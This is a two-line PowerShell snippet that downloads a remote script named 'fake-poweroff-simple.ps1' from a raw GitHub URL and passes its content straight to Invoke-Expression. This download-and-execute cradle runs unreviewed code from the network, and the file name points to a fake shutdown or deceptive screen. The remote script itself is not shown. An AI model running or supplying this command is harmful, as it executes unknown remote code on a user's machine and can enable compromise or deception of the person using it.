$url="https://raw.githubusercontent.com/Zhuss1/main/main/fake-poweroff-simple.ps1"
Invoke-Expression (Invoke-WebRequest -UseBasicParsing $url).Content
